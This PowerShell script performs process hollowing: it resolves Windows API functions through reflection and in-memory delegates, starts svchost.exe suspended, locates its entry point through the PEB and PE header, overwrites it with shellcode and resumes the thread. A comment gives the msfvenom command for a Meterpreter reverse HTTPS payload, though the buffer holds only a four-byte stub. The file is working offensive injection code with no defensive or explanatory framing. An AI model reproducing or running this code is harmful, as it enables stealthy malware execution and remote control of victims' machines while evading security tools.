Function Standard_Process_Hollowing_Delegate_InMemory {

function Invoke-FunctionLookup {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [string] $moduleName,
        [Parameter(Position = 1, Mandatory = $true)] 
        [string] $functionName
    )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $getProcAddressMethod = $systemType.GetMethods() | Where-Object { $_.Name -eq "GetProcAddress" }
    $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
}

# Function to dynamically create delegates
function Invoke-GetDelegate {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [Type[]] $parameterTypes,
        [Parameter(Position = 1, Mandatory = $false)] 
        [Type] $returnType = [Void]
    )

    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType', 
        [System.Reflection.TypeAttributes]::Class -bor 
        [System.Reflection.TypeAttributes]::Public -bor 
        [System.Reflection.TypeAttributes]::Sealed -bor 
        [System.Reflection.TypeAttributes]::AnsiClass -bor 
        [System.Reflection.TypeAttributes]::AutoClass, 
        [System.MulticastDelegate]
    )

    $constructorBuilder = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )

    $constructorBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::NewSlot -bor 
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )

    $methodBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    return $typeBuilder.CreateType()
}

# Load necessary types from System.dll assembly using reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.UnsafeNativeMethods') }
$nativeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods') }

# Load some structures we need for various functions
$startupInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods+STARTUPINFO') }
$processInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION') }

# Define ConstructorInfo arrays from those loaded above
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "ReadProcessMemory"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr]) ([Bool]))
) 

$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "WriteProcessMemory"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [Int], [IntPtr]) ([Bool]))
)

$ResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "ResumeThread"), 
    (Invoke-GetDelegate @([IntPtr]) ([void]))
)

$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "CloseHandle"), 
    (Invoke-GetDelegate @([IntPtr]) ([bool]))
)

# Get function pointers for ntdll functions
$ZwQueryInformationProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "ZwQueryInformationProcess"), 
    (Invoke-GetDelegate @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([int]))
)

# Get current directory path
$CurrentPath = (Get-Item -Path ".\" -Verbose).FullName

#CreateProcess
$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $CurrentPath, $startupInformation, $processInformation))  > $null

# Obtain the required handles from the PROCESS_INFORMATION structure
$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

# Query process information to get the PEB address of the process
$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$tmp = [UInt32]0
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, $tmp)  > $null
$pebBaseAddress = [BitConverter]::ToInt64($processBasicInformation, 8)
$ptrToImageBase = [IntPtr]($pebBaseAddress + 0x10)

# Read the memory to get the base address of the executable
[byte[]] $addrBuf = New-Object byte[] ([IntPtr]::Size)
$readSuccess = $ReadProcessMemory.Invoke($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.Length, [IntPtr]::Zero)  > $null

# Calculate the base address of svchost.exe
$svchostBase = [IntPtr]::Zero
if ([IntPtr]::Size -eq 8) {
    $svchostBase = [IntPtr]::new([System.BitConverter]::ToInt64($addrBuf, [IntPtr]::Zero))
} else {
    $svchostBase = [IntPtr]::new([System.BitConverter]::ToInt32($addrBuf, [IntPtr]::Zero))
}

# Convert svchostBase to UInt64 for entry point calculation
$svchostBase64 = [UInt64]$svchostBase.ToInt64()

# Read more memory to locate the entry point
[byte[]] $data = New-Object byte[] 0x200
$ReadProcessMemory.Invoke($hProcess, $svchostBase, $data, 0x200, [IntPtr]::Zero)  > $null

# Get the entry point of the executable
$e_lfanew_offset = [BitConverter]::ToUInt32($data, 0x3C)
$opthdr = $e_lfanew_offset + 0x28
$entrypoint_rva = [BitConverter]::ToUInt32($data, [int]$opthdr)

# Calculate the address of the entry point
$addressOfEntryPoint = [IntPtr]::new($entrypoint_rva + $svchostBase64)

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f powershell EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4

# Write the shellcode to the entry point of the executable
$WriteProcessMemory.Invoke($hProcess, $addressOfEntryPoint, $buf, $buf.Length, [IntPtr]::Zero) > $null

# Resume the main thread of the process
$ResumeThread.Invoke($processInformation.hThread) > $null

# Cleanup
$CloseHandle.Invoke($processInformation.hProcess) > $null
$CloseHandle.Invoke($processInformation.hThread) > $null

}

Standard_Process_Hollowing_Delegate_InMemory
